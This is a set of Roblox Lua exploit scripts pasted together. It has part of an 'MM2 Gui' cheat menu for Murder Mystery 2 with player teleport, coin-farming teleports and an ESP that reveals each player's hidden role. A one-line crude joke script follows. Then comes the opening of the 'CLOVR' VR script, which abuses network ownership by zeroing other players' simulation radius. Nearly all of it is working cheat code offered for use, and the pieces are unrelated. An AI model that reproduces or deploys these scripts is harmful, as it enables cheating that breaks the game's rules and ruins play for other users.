LocalScript33.Parent = TextButton31
table.insert(cors,sandbox(LocalScript33,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Shows The Names Of The Murder and Sherrif In The Side Boxes."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextLabel34.Name = "KeepUiAliveLabel"
TextLabel34.Parent = Frame1
TextLabel34.Position = UDim2.new(0.0220883545, 0, 0.0951086953, 0)
TextLabel34.Size = UDim2.new(0, 167, 0, 14)
TextLabel34.BackgroundColor = BrickColor.new("Institutional white")
TextLabel34.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel34.BackgroundTransparency = 1
TextLabel34.Font = Enum.Font.SourceSans
TextLabel34.FontSize = Enum.FontSize.Size14
TextLabel34.Text = "UI Keep Alive"
TextLabel34.TextColor = BrickColor.new("Institutional white")
TextLabel34.TextColor3 = Color3.new(1, 1, 1)
TextLabel34.TextScaled = true
TextLabel34.TextSize = 14
TextLabel34.TextWrap = true
TextLabel34.TextWrapped = true
TextBox35.Name = "TpTo"
TextBox35.Parent = Frame1
TextBox35.Position = UDim2.new(0.696787119, 0, 0.258152217, 0)
TextBox35.Size = UDim2.new(0, 99, 0, 19)
TextBox35.BackgroundColor = BrickColor.new("Really black")
TextBox35.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox35.BorderColor = BrickColor.new("Institutional white")
TextBox35.BorderColor3 = Color3.new(1, 1, 1)
TextBox35.Font = Enum.Font.SourceSans
TextBox35.FontSize = Enum.FontSize.Size14
TextBox35.Text = "Player"
TextBox35.TextColor = BrickColor.new("Institutional white")
TextBox35.TextColor3 = Color3.new(1, 1, 1)
TextBox35.TextScaled = true
TextBox35.TextSize = 14
TextBox35.TextWrap = true
TextBox35.TextWrapped = true
TextBox35.ClearTextOnFocus = false
TextButton36.Name = "ExecuteTpToPlayer"
TextButton36.Parent = Frame1
TextButton36.Position = UDim2.new(0.696787119, 0, 0.163043395, 0)
TextButton36.Size = UDim2.new(0, 99, 0, 35)
TextButton36.BackgroundColor = BrickColor.new("Really black")
TextButton36.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton36.BorderColor = BrickColor.new("Institutional white")
TextButton36.BorderColor3 = Color3.new(1, 1, 1)
TextButton36.Font = Enum.Font.SourceSans
TextButton36.FontSize = Enum.FontSize.Size14
TextButton36.Text = "Execute Tp To Player"
TextButton36.TextColor = BrickColor.new("Sand violet metallic")
TextButton36.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton36.TextScaled = true
TextButton36.TextSize = 14
TextButton36.TextWrap = true
TextButton36.TextWrapped = true
LocalScript37.Name = "Execute"
LocalScript37.Parent = TextButton36
table.insert(cors,sandbox(LocalScript37,function()
local Output = script.Parent.Parent.OutputBox
local Player = game.Players.LocalPlayer
local TpTo = script.Parent.Parent.TpTo

script.Parent.MouseButton1Down:Connect(function()
	Output.Text = "//EXE//: Executed Tp To Player"
	warn("Executed Tp To Player - MM2 UI")
	
	game.Workspace[Player.Name].HumanoidRootPart.CFrame = game.Workspace[TpTo.Text].HumanoidRootPart.CFrame
	Output.Text = ("//Runner//: Teleported To "..TpTo)
	warn("Teleported To "..TpTo.." - MM2 UI")
end)
end))
LocalScript38.Name = "HoverDetector"
LocalScript38.Parent = TextButton36
table.insert(cors,sandbox(LocalScript38,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Teleports You To The Player Selected In The Box."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextButton39.Name = "UIKeepAlive"
TextButton39.Parent = Frame1
TextButton39.Position = UDim2.new(0.317269057, 0, 0.0951086953, 0)
TextButton39.Size = UDim2.new(0, 14, 0, 14)
TextButton39.BackgroundColor = BrickColor.new("Really red")
TextButton39.BackgroundColor3 = Color3.new(1, 0, 0)
TextButton39.BorderColor = BrickColor.new("Institutional white")
TextButton39.BorderColor3 = Color3.new(1, 1, 1)
TextButton39.Font = Enum.Font.SourceSans
TextButton39.FontSize = Enum.FontSize.Size14
TextButton39.Text = ""
TextButton39.TextColor = BrickColor.new("Really black")
TextButton39.TextColor3 = Color3.new(0, 0, 0)
TextButton39.TextSize = 14
LocalScript40.Name = "HoverDetector"
LocalScript40.Parent = TextButton39
table.insert(cors,sandbox(LocalScript40,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Respawns UI When You Die If Green."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
LocalScript41.Name = "Execute"
LocalScript41.Parent = TextButton39
table.insert(cors,sandbox(LocalScript41,function()
local Output = script.Parent.Parent.OutputBox
local On = false
local GetUI = script.Parent.Parent.Parent

script.Parent.MouseButton1Down:Connect(function()
	warn("   //Exe//: Executed Toggle UI Keep Alive - MM2 UI")
	
	if On == false then
		Output.Text = "   //RUNNER//: Toggled UI Keep Alive To True"
		GetUI.Parent = game.CoreGui
		script.Parent.BackgroundColor3 = Color3.fromRGB(35, 255, 2)
	else
		Output.Text = "   //RUNNER//: Toggled UI Keep Alive To False"
		GetUI.Parent = game.Players.LocalPlayer.PlayerGui
		script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	end	
	On = not On
	
end)
end))
TextButton42.Name = "ExecuteTargetEsp"
TextButton42.Parent = Frame1
TextButton42.Position = UDim2.new(0.696787119, 0, 0.328804284, 0)
TextButton42.Size = UDim2.new(0, 99, 0, 36)
TextButton42.BackgroundColor = BrickColor.new("Really black")
TextButton42.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton42.BorderColor = BrickColor.new("Institutional white")
TextButton42.BorderColor3 = Color3.new(1, 1, 1)
TextButton42.Font = Enum.Font.SourceSans
TextButton42.FontSize = Enum.FontSize.Size14
TextButton42.Text = "Execute Target ESP // OFF"
TextButton42.TextColor = BrickColor.new("Sand violet metallic")
TextButton42.TextColor3 = Color3.new(0.580392, 0.580392, 0.580392)
TextButton42.TextScaled = true
TextButton42.TextSize = 14
TextButton42.TextWrap = true
TextButton42.TextWrapped = true
LocalScript43.Name = "Execute"
LocalScript43.Parent = TextButton42
table.insert(cors,sandbox(LocalScript43,function()
local Output = script.Parent.Parent.OutputBox
local Active = false
local Par = script.Parent
local Player = script.Parent.Parent.TargetPlr

script.Parent.MouseButton1Down:Connect(function()
	
	if Active == false then
		Active = true
		warn("Executed Target ESP: On - MM2 UI")
		Output.Text = "   //EXE//: Executed Target ESP: On"
		Par.Text = "Execute Target ESP  //  ON"
		
		if game.Players[Player.Text].Backpack:findFirstChild("Knife") or game.Players[Player.Text].Character:findFirstChild("Knife") then
			local esp = Instance.new("BoxHandleAdornment")
			esp.Parent = game.Workspace[Player.Text].Head
			esp.Size = Vector3.new(1,1,1)
			esp.Color3 = Color3.new(1, 0, 0.0156863)
			esp.AlwaysOnTop = true
			esp.Adornee = game.Workspace[Player.Text].Head
			esp.Visible = true
			esp.ZIndex = 2
		elseif game.Players[Player.Text].Backpack:findFirstChild("Gun") or game.Players[Player.Text].Character:findFirstChild("Gun") then
			local esp = Instance.new("BoxHandleAdornment")
			esp.Parent = game.Workspace[Player.Text].Head
			esp.Size = Vector3.new(1,1,1)
			esp.Color3 = Color3.new(0, 0.0156863, 1)
			esp.AlwaysOnTop = true
			esp.Adornee = game.Workspace[Player.Text].Head
			esp.Visible = true
			esp.ZIndex = 2
		else
			local esp = Instance.new("BoxHandleAdornment")
			esp.Parent = game.Workspace[Player.Text].Head
			esp.Size = Vector3.new(1,1,1)
			esp.Color3 = Color3.new(0.0470588, 1, 0)
			esp.AlwaysOnTop = true
			esp.Adornee = game.Workspace[Player.Text].Head
			esp.Visible = true
			esp.ZIndex = 2
		end
		
	
	elseif Active == true then
		Active = false
		warn("Executed Target ESP: Off - MM2 UI")
		Output.Text = "   //EXE//: Executed Target ESP: Off"
		Par.Text = "Execute Target ESP  //  OFF"

		local GetOldEsp = game.Workspace[Player.Text].Head.BoxHandleAdornment:Destroy()
	end
end)
end))
LocalScript44.Name = "HoverDetector"
LocalScript44.Parent = TextButton42
table.insert(cors,sandbox(LocalScript44,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Loads An ESP That Tracks Down The Person Selected In The Box And Shows Their Role Color."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextBox45.Name = "TargetPlr"
TextBox45.Parent = Frame1
TextBox45.Position = UDim2.new(0.696787119, 0, 0.423913091, 0)
TextBox45.Size = UDim2.new(0, 99, 0, 19)
TextBox45.BackgroundColor = BrickColor.new("Really black")
TextBox45.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox45.BorderColor = BrickColor.new("Institutional white")
TextBox45.BorderColor3 = Color3.new(1, 1, 1)
TextBox45.Font = Enum.Font.SourceSans
TextBox45.FontSize = Enum.FontSize.Size14
TextBox45.Text = "Player"
TextBox45.TextColor = BrickColor.new("Institutional white")
TextBox45.TextColor3 = Color3.new(1, 1, 1)
TextBox45.TextScaled = true
TextBox45.TextSize = 14
TextBox45.TextWrap = true
TextBox45.TextWrapped = true
TextBox45.ClearTextOnFocus = false
TextLabel46.Name = "TpToCoinsLabel"
TextLabel46.Parent = Frame1
TextLabel46.Position = UDim2.new(0.540160656, 0, 0.0951086953, 0)
TextLabel46.Size = UDim2.new(0, 167, 0, 14)
TextLabel46.BackgroundColor = BrickColor.new("Institutional white")
TextLabel46.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel46.BackgroundTransparency = 1
TextLabel46.Font = Enum.Font.SourceSans
TextLabel46.FontSize = Enum.FontSize.Size14
TextLabel46.Text = "Tp To All Current Coins"
TextLabel46.TextColor = BrickColor.new("Institutional white")
TextLabel46.TextColor3 = Color3.new(1, 1, 1)
TextLabel46.TextScaled = true
TextLabel46.TextSize = 14
TextLabel46.TextWrap = true
TextLabel46.TextWrapped = true
TextButton47.Name = "TPToCoins"
TextButton47.Parent = Frame1
TextButton47.Position = UDim2.new(0.865461826, 0, 0.0951086953, 0)
TextButton47.Size = UDim2.new(0, 14, 0, 14)
TextButton47.BackgroundColor = BrickColor.new("Really red")
TextButton47.BackgroundColor3 = Color3.new(1, 0, 0)
TextButton47.BorderColor = BrickColor.new("Institutional white")
TextButton47.BorderColor3 = Color3.new(1, 1, 1)
TextButton47.Font = Enum.Font.SourceSans
TextButton47.FontSize = Enum.FontSize.Size14
TextButton47.Text = ""
TextButton47.TextColor = BrickColor.new("Really black")
TextButton47.TextColor3 = Color3.new(0, 0, 0)
TextButton47.TextSize = 14
LocalScript48.Name = "HoverDetector"
LocalScript48.Parent = TextButton47
table.insert(cors,sandbox(LocalScript48,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Loop tps you through coins on the ground until none are left(For loop use auto clicker)."
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
LocalScript49.Name = "Execute"
LocalScript49.Parent = TextButton47
table.insert(cors,sandbox(LocalScript49,function()
local Output = script.Parent.Parent.OutputBox
local GetUI = script.Parent.Parent.Parent

script.Parent.MouseButton1Down:Connect(function()
	warn("   //EXE//: Executed Toggle Loop Through Coins - MM2 UI")
	script.Parent.BackgroundColor3 = Color3.fromRGB(35, 255, 2)
	
		
		
	for i,child in pairs(game.Workspace:GetDescendants()) do
		if child.Name == "Coin_Server" then
			game.Workspace[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = child.CFrame
			wait(3)
		end
	end
	script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
end)
end))
Frame50.Name = "MiniFrame"
Frame50.Parent = ScreenGui0
Frame50.Position = UDim2.new(0.190322578, 0, 0.421364963, 0)
Frame50.Visible = false
Frame50.Size = UDim2.new(0, 174, 0, 26)
Frame50.BackgroundColor = BrickColor.new("Really black")
Frame50.BackgroundColor3 = Color3.new(0, 0, 0)
LocalScript51.Name = "DragableUI"
LocalScript51.Parent = Frame50
table.insert(cors,sandbox(LocalScript51,function()
local UserInputService = game:GetService("UserInputService")
local MiniFrame = script.Parent
local TopBar = MiniFrame:WaitForChild("TopBar")
local Camera = workspace:WaitForChild("Camera")
local DragMousePosition
local FramePosition
local Draggable = false

TopBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Draggable = true
		DragMousePosition = Vector2.new(input.Position.X, input.Position.Y)
		FramePosition = Vector2.new(MiniFrame.Position.X.Scale, MiniFrame.Position.Y.Scale)
	end
end)

TopBar.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Draggable = false
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if Draggable == true then
		local NewPosition = FramePosition + ((Vector2.new(input.Position.X, input.Position.Y) - DragMousePosition) / Camera.ViewportSize)
		MiniFrame.Position = UDim2.new(NewPosition.X, 0, NewPosition.Y, 0)
	end
end)
end))
TextButton52.Name = "MaximizeButton"
TextButton52.Parent = Frame50
TextButton52.Position = UDim2.new(0.700664699, 0, 0, 0)
TextButton52.Size = UDim2.new(0, 26, 0, 26)
TextButton52.BackgroundColor = BrickColor.new("Medium brown")
TextButton52.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
TextButton52.BorderSizePixel = 0
TextButton52.Font = Enum.Font.Code
TextButton52.FontSize = Enum.FontSize.Size14
TextButton52.Text = "+"
TextButton52.TextColor = BrickColor.new("Institutional white")
TextButton52.TextColor3 = Color3.new(1, 1, 1)
TextButton52.TextScaled = true
TextButton52.TextSize = 14
TextButton52.TextWrap = true
TextButton52.TextWrapped = true
LocalScript53.Name = "Max"
LocalScript53.Parent = TextButton52
table.insert(cors,sandbox(LocalScript53,function()
local Main = script.Parent.Parent.Parent.MainFrame
local Mini = script.Parent.Parent

script.Parent.MouseButton1Down:Connect(function()
	Mini.Visible = false
	Main.Visible = true
end)

end))
LocalScript54.Name = "HoverDetector"
LocalScript54.Parent = TextButton52
table.insert(cors,sandbox(LocalScript54,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Maximize"
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextButton55.Name = "DestroyButton"
TextButton55.Parent = Frame50
TextButton55.Position = UDim2.new(0.850089967, 0, 0, 0)
TextButton55.Size = UDim2.new(0, 26, 0, 26)
TextButton55.BackgroundColor = BrickColor.new("Dark taupe")
TextButton55.BackgroundColor3 = Color3.new(0.301961, 0.301961, 0.301961)
TextButton55.BorderSizePixel = 0
TextButton55.Font = Enum.Font.Code
TextButton55.FontSize = Enum.FontSize.Size14
TextButton55.Text = "X"
TextButton55.TextColor = BrickColor.new("Really red")
TextButton55.TextColor3 = Color3.new(1, 0, 0.0156863)
TextButton55.TextScaled = true
TextButton55.TextSize = 14
TextButton55.TextWrap = true
TextButton55.TextWrapped = true
LocalScript56.Name = "Destroy"
LocalScript56.Parent = TextButton55
table.insert(cors,sandbox(LocalScript56,function()
script.Parent.MouseButton1Down:Connect(function()
local GetUI = script.Parent.Parent.Parent:Destroy()
end)
end))
LocalScript57.Name = "HoverDetector"
LocalScript57.Parent = TextButton55
table.insert(cors,sandbox(LocalScript57,function()
local DialogBox = script.Parent.Parent.ShowDialog

script.Parent.MouseEnter:Connect(function()
	DialogBox.Visible = true
	DialogBox.Text = "Destroys The Entire Gui And Its Components"
end)

script.Parent.MouseLeave:Connect(function()
	DialogBox.Visible = false
end)
end))
TextLabel58.Parent = Frame50
TextLabel58.Position = UDim2.new(0, 0, 0.0384615399, 0)
TextLabel58.Size = UDim2.new(0, 121, 0, 24)
TextLabel58.BackgroundColor = BrickColor.new("Really black")
TextLabel58.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel58.BackgroundTransparency = 1
TextLabel58.Font = Enum.Font.SourceSans
TextLabel58.FontSize = Enum.FontSize.Size14
TextLabel58.Text = "MM2 Gui"
TextLabel58.TextColor = BrickColor.new("Really red")
TextLabel58.TextColor3 = Color3.new(1, 0, 0.0156863)
TextLabel58.TextScaled = true
TextLabel58.TextSize = 14
TextLabel58.TextWrap = true
TextLabel58.TextWrapped = true
Frame59.Name = "TopBar"
Frame59.Parent = Frame50
Frame59.Position = UDim2.new(0, 0, -0.346153855, 0)
Frame59.Size = UDim2.new(0, 174, 0, 10)
Frame59.BackgroundColor = BrickColor.new("Institutional white")
Frame59.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel60.Name = "ShowDialog"
TextLabel60.Parent = Frame50
TextLabel60.Position = UDim2.new(-0.00507959817, 0, 0.998402536, 0)
TextLabel60.Visible = false
TextLabel60.Size = UDim2.new(0, 174, 0, 39)
TextLabel60.BackgroundColor = BrickColor.new("Medium brown")
TextLabel60.BackgroundColor3 = Color3.new(0.258824, 0.258824, 0.258824)
TextLabel60.Font = Enum.Font.SourceSans
TextLabel60.FontSize = Enum.FontSize.Size14
TextLabel60.Text = "None"
TextLabel60.TextColor = BrickColor.new("Really black")
TextLabel60.TextColor3 = Color3.new(0, 0, 0)
TextLabel60.TextScaled = true
TextLabel60.TextSize = 14
TextLabel60.TextStrokeColor3 = Color3.new(1, 1, 1)
TextLabel60.TextStrokeTransparency = 0
TextLabel60.TextWrap = true
TextLabel60.TextWrapped = true
ScreenGui61.Name = "VisualRoleESPGui"
ScreenGui61.Parent = ScreenGui0
ScreenGui61.ResetOnSpawn = false
Frame62.Parent = ScreenGui61
Frame62.Position = UDim2.new(0.166156977, 0, 0, 0)
Frame62.Visible = false
Frame62.Size = UDim2.new(0, 163, 0, 227)
Frame62.BackgroundColor = BrickColor.new("Really black")
Frame62.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton63.Name = "ESPon"
TextButton63.Parent = ScreenGui61
TextButton63.Position = UDim2.new(0.166156977, 0, -4.41335142e-05, 0)
TextButton63.Visible = false
TextButton63.Size = UDim2.new(0, 163, 0, 50)
TextButton63.BackgroundColor = BrickColor.new("Lime green")
TextButton63.BackgroundColor3 = Color3.new(0, 1, 0)
TextButton63.Font = Enum.Font.SourceSans
TextButton63.FontSize = Enum.FontSize.Size14
TextButton63.Text = "ESP ON (press E)"
TextButton63.TextColor = BrickColor.new("Really black")
TextButton63.TextColor3 = Color3.new(0, 0, 0)
TextButton63.TextScaled = true
TextButton63.TextSize = 14
TextButton63.TextWrap = true
TextButton63.TextWrapped = true
TextButton64.Name = "ESPOff"
TextButton64.Parent = ScreenGui61
TextButton64.Position = UDim2.new(0.166156977, 0, 0.105935514, 0)
TextButton64.Visible = false
TextButton64.Size = UDim2.new(0, 163, 0, 50)
TextButton64.BackgroundColor = BrickColor.new("Really red")
TextButton64.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
TextButton64.Font = Enum.Font.SourceSans
TextButton64.FontSize = Enum.FontSize.Size14
TextButton64.Text = "ESP OFF (press F)"
TextButton64.TextColor = BrickColor.new("Really black")
TextButton64.TextColor3 = Color3.new(0, 0, 0)
TextButton64.TextScaled = true
TextButton64.TextSize = 14
TextButton64.TextWrap = true
TextButton64.TextWrapped = true
TextButton65.Name = "HIDE"
TextButton65.Parent = ScreenGui61
TextButton65.Position = UDim2.new(0.166156977, 0, 0.211999387, 0)
TextButton65.Visible = false
TextButton65.Size = UDim2.new(0, 163, 0, 56)
TextButton65.BackgroundColor = BrickColor.new("Really red")
TextButton65.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
TextButton65.Font = Enum.Font.SourceSans
TextButton65.FontSize = Enum.FontSize.Size14
TextButton65.Text = "HIDE"
TextButton65.TextColor = BrickColor.new("Really black")
TextButton65.TextColor3 = Color3.new(0, 0, 0)
TextButton65.TextScaled = true
TextButton65.TextSize = 14
TextButton65.TextWrap = true
TextButton65.TextWrapped = true
TextButton66.Name = "OPEN"
TextButton66.Parent = ScreenGui61
TextButton66.Position = UDim2.new(0, 0, 0.0418502204, 0)
TextButton66.Visible = false
TextButton66.Size = UDim2.new(0, 116, 0, 19)
TextButton66.Active = false
TextButton66.BackgroundColor = BrickColor.new("Lime green")
TextButton66.BackgroundColor3 = Color3.new(0.0117647, 1, 0.0117647)
TextButton66.Font = Enum.Font.SourceSans
TextButton66.FontSize = Enum.FontSize.Size14
TextButton66.Text = "OPEN"
TextButton66.TextColor = BrickColor.new("Really black")
TextButton66.TextColor3 = Color3.new(0, 0, 0)
TextButton66.TextScaled = true
TextButton66.TextSize = 14
TextButton66.TextWrap = true
TextButton66.TextWrapped = true
LocalScript67.Parent = ScreenGui61
Folder68.Name = "Scripts"
Folder68.Parent = ScreenGui0
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
@
--Chase Gay-
print("me big gay - chase")
@
--Fake vr-
-- CLOVR - FE FULL-BODY VR SCRIPT


-- April 21st Update - TOOL HOLDING ADDED




--  | made by 0866!!!!!!! and abacaxl!!!!!!!!
--  | tysm unverified

-- This is an older version of CLOVR, I found that the legs would 'walk' better in this version than the one we released. 

--Controls are a bit different from last release because this is older. Still works good!

--RagDollEnabled is set to true, DON'T set it to false or CLOVR won't work. Feel free to change the other settings though. -Abacaxl





--|| Settings:

local StudsOffset = 0 -- Character height (negative if you're too high)
local Smoothness = .5 -- Character interpolation (0.1 - 1 = smooth - rigid)

local AnchorCharacter = true -- Prevent physics from causing inconsistencies
local HideCharacter = false -- Hide character on a platform
local NoCollision = true -- Disable player collision

local ChatEnabled = true -- See chat on your left hand in-game
 local ChatLocalRange = 75 -- Local chat range

local ViewportEnabled = true -- View nearby players in a frame
 local ViewportRange = 30 -- Maximum distance players are updated

local RagdollEnabled = true -- Use your character instead of hats (NetworkOwner vulnerability)
 local RagdollHeadMovement = true -- Move your head separately from your body (+9 second wait)

local AutoRun = false -- Run script on respawn
local AutoRespawn = true -- Kill your real body when your virtual body dies

local WearAllAccessories = true -- Use all leftover hats for the head
local AccurateHandPosition = true -- Move your Roblox hands according to your real hands

local AccessorySettings = {
	LeftArm		= "";
	RightArm	= "";
	LeftLeg		= "";
	RightLeg	= "";
	Torso		= "";
	Head		= true;
	
	BlockArms	= true;
	BlockLegs	= true;
	BlockTorso	= true;
	
	LimbOffset	= CFrame.Angles(math.rad(90), 0, 0);
}

local FootPlacementSettings = {
	RightOffset = Vector3.new(.5, 0, 0),
	LeftOffset = Vector3.new(-.5, 0, 0),
}

--|| Script:

local Script = nil;

Script = function()

--[[
	Variables
--]]

local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
  local Character = Client.Character or Client.CharacterAdded:Wait()
   local WeldBase = Character:WaitForChild("HumanoidRootPart")
   local ArmBase = Character:FindFirstChild("RightHand") or Character:FindFirstChild("Right Arm") or WeldBase
  local Backpack = Client:WaitForChild("Backpack")
  local Mouse = Client:GetMouse()

local Camera = workspace.CurrentCamera

local VRService = game:GetService("VRService")
 local VRReady = VRService.VREnabled

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")	

local HeadAccessories = {};
local UsedAccessories = {};

local Pointer = false;
local Point1 = false;
local Point2 = false;

local VirtualRig = game:GetObjects("rbxassetid://4468539481")[1]
local VirtualBody = game:GetObjects("rbxassetid://4464983829")[1]

local Anchor = Instance.new("Part")

Anchor.Anchored = true
Anchor.Transparency = 1
Anchor.CanCollide = false
Anchor.Parent = workspace

if RagdollEnabled then
	print("RagdollEnabled, thank you for using CLOVR!")
	local NetworkAccess = coroutine.create(function()
settings().Physics.AllowSleep = false
while true do game:GetService("RunService").RenderStepped:Wait()
for _,Players in next, game:GetService("Players"):GetChildren() do
if Players ~= game:GetService("Players").LocalPlayer then
Players.MaximumSimulationRadius = 0.1 Players.SimulationRadius = 0 end end
game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
game:GetService("Players").LocalPlayer.SimulationRadius = math.huge*math.huge end end)
coroutine.resume(NetworkAccess)
end

StarterGui:SetCore("VRLaserPointerMode", 3)

--[[
	Character Protection
--]]

local CharacterCFrame = WeldBase.CFrame

if not RagdollEnabled then
	Character.Humanoid.AnimationPlayed:Connect(function(Animation)
		Animation:Stop()
	end)
	
	for _, Track in next, Character.Humanoid:GetPlayingAnimationTracks() do
		Track:Stop()
	end
	
	if HideCharacter then
		local Platform = Instance.new("Part")
		
		Platform.Anchored = true
		Platform.Size = Vector3.new(100, 5, 100)
		Platform.CFrame = CFrame.new(0, 10000, 0)
		Platform.Transparency = 1
		Platform.Parent = workspace
		
		Character:MoveTo(Platform.Position + Vector3.new(0, 5, 0))
		
		wait(.5)
	end
	
	if AnchorCharacter then
		for _, Part in pairs(Character:GetChildren()) do
			if Part:IsA("BasePart") then
				Part.Anchored = true
			end
		end
	end
end

--[[
	Functions
--]]

function Tween(Object, Style, Direction, Time, Goal)
    local tweenInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
    local tween = game:GetService("TweenService"):Create(Object, tweenInfo, Goal)

	tween.Completed:Connect(function()
		tween:Destroy()
	end)
	
    tween:Play()

    return tween
end

local function GetMotorForLimb(Limb)
	for _, Motor in next, Character:GetDescendants() do
		if Motor:IsA("Motor6D") and Motor.Part1 == Limb then
			return Motor
		end
	end
end

local function CreateAlignment(Limb, Part0)
	local Attachment0 = Instance.new("Attachment", Part0 or Anchor)
	local Attachment1 = Instance.new("Attachment", Limb)
	
	local Orientation = Instance.new("AlignOrientation")
	local Position = Instance.new("AlignPosition")
	
	Orientation.Attachment0 = Attachment1
	Orientation.Attachment1 = Attachment0
	Orientation.RigidityEnabled = false
	Orientation.MaxTorque = 20000
	Orientation.Responsiveness = 40
	Orientation.Parent = Character.HumanoidRootPart
	
	Position.Attachment0 = Attachment1
	Position.Attachment1 = Attachment0
	Position.RigidityEnabled = false
	Position.MaxForce = 40000
	Position.Responsiveness = 40
	Position.Parent = Character.HumanoidRootPart
	
	Limb.Massless = false
	
	local Motor = GetMotorForLimb(Limb)
	if Motor then
		Motor:Destroy()
	end
	
	return function(CF, Local)
		if Local then
			Attachment0.CFrame = CF
		else
			Attachment0.WorldCFrame = CF
		end
	end;
end

local function GetExtraTool()
	for _, Tool in next, Character:GetChildren() do
		if Tool:IsA("Tool") and not Tool.Name:match("LIMB_TOOL") then
			return Tool
		end
	end
end

local function GetGripForHandle(Handle)
	for _, Weld in next, Character:GetDescendants() do
		if Weld:IsA("Weld") and (Weld.Part0 == Handle or Weld.Part1 == Handle) then
			return Weld
		end
	end
	
	wait(.2)
	
	for _, Weld in next, Character:GetDescendants() do
		if Weld:IsA("Weld") and (Weld.Part0 == Handle or Weld.Part1 == Handle) then
			return Weld
		end
	end
end

local function CreateRightGrip(Handle)
	local RightGrip = Instance.new("Weld")
	
	RightGrip.Name = "RightGrip"
	RightGrip.Part1 = Handle
	RightGrip.Part0 = WeldBase
	RightGrip.Parent = WeldBase
	
	return RightGrip
end

local function CreateAccessory(Accessory, DeleteMeshes)
	if not Accessory then
		return
	end
	
	local HatAttachment = Accessory.Handle:FindFirstChildWhichIsA("Attachment")
	local HeadAttachment = VirtualRig:FindFirstChild(HatAttachment.Name, true)
	local BasePart = HeadAttachment.Parent
	
	local HatAtt = HatAttachment.CFrame
	local HeadAtt = HeadAttachment.CFrame
	
	if DeleteMeshes then
		if Accessory.Handle:FindFirstChild("Mesh") then
			Accessory.Handle.Mesh:Destroy()
		end
	end
	
	wait()
	
	local Handle = Accessory:WaitForChild("Handle")
	
	if Handle:FindFirstChildWhichIsA("Weld", true) then
		Handle:FindFirstChildWhichIsA("Weld", true):Destroy()
		Handle:BreakJoints()
	else
		Handle:BreakJoints()
	end
	
	Handle.Massless = true
	Handle.Transparency = 0.5
	
	UsedAccessories[Accessory] = true
	
	local RightGrip = CreateRightGrip(Handle)
	
	wait()
	
	for _, Object in pairs(Handle:GetDescendants()) do
		if not Object:IsA("BasePart") then
			pcall(function()
				Object.Transparency = 1
			end)
			
			pcall(function()
				Object.Enabled = false
			end)
		end
	end
	
	return Handle, RightGrip, HatAtt, HeadAtt, BasePart;
end

local function GetHeadAccessories()
	for _, Accessory in next, Character:GetChildren() do
		if Accessory:IsA("Accessory") and not UsedAccessories[Accessory] then
			local Handle, RightGrip, HatAtt, HeadAtt, BasePart = CreateAccessory(Accessory)
			
			table.insert(HeadAccessories, {Handle, RightGrip, HatAtt, HeadAtt, BasePart})
			
			do
				Handle.Transparency = 1
			end
			
			if not WearAllAccessories then
				break
			end
		end
	end
end

--[[
	VR Replication Setup
--]]

if not RagdollEnabled then
	LeftHandle, LeftHandGrip = CreateAccessory(Character:FindFirstChild(AccessorySettings.LeftArm), AccessorySettings.BlockArms)
	RightHandle, RightHandGrip = CreateAccessory(Character:FindFirstChild(AccessorySettings.RightArm), AccessorySettings.BlockArms)
	LeftHipHandle, LeftLegGrip = CreateAccessory(Character:FindFirstChild(AccessorySettings.LeftLeg), AccessorySettings.BlockLegs)
	RightHipHandle, RightLegGrip = CreateAccessory(Character:FindFirstChild(AccessorySettings.RightLeg), AccessorySettings.BlockLegs)
	TorsoHandle, TorsoGrip = CreateAccessory(Character:FindFirstChild(AccessorySettings.Torso), AccessorySettings.BlockTorso)
